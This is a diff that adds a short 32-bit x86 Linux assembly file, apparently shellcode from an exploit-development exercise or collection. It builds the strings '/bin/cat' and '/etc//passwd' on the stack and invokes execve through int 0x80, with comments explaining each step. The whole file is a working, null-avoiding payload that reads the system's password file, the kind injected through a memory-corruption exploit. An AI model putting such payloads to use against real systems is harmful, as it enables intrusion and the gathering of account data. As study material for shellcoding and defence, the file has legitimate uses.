@@ -1,0 +1,23 @@
+global _start
+
+section .text
+
+_start:
+        xor ecx, ecx                  ;zero out ecx
+        mul ecx                       ;zero out edx and eax
+        push edx                      
+        push dword 0x7461632f         ; Here it pushes /bin/cat (little endian)
+        push dword 0x6e69622f         ; to stack
+        mov ebx,esp 
+        push ecx 
+        push dword 0x64777373         ; This pushes /etc//passwd
+        push dword 0x61702f2f         
+        push dword 0x6374652f 
+        mov esi, esp                  ;Place a pointer into esi and then ecx
+        xchg ecx, esi 
+        push eax 
+        mov al, 11 
+        push ecx 
+        push ebx 
+        mov ecx, esp                  ; Place our arguments in ecx and execute
+        int 0x80
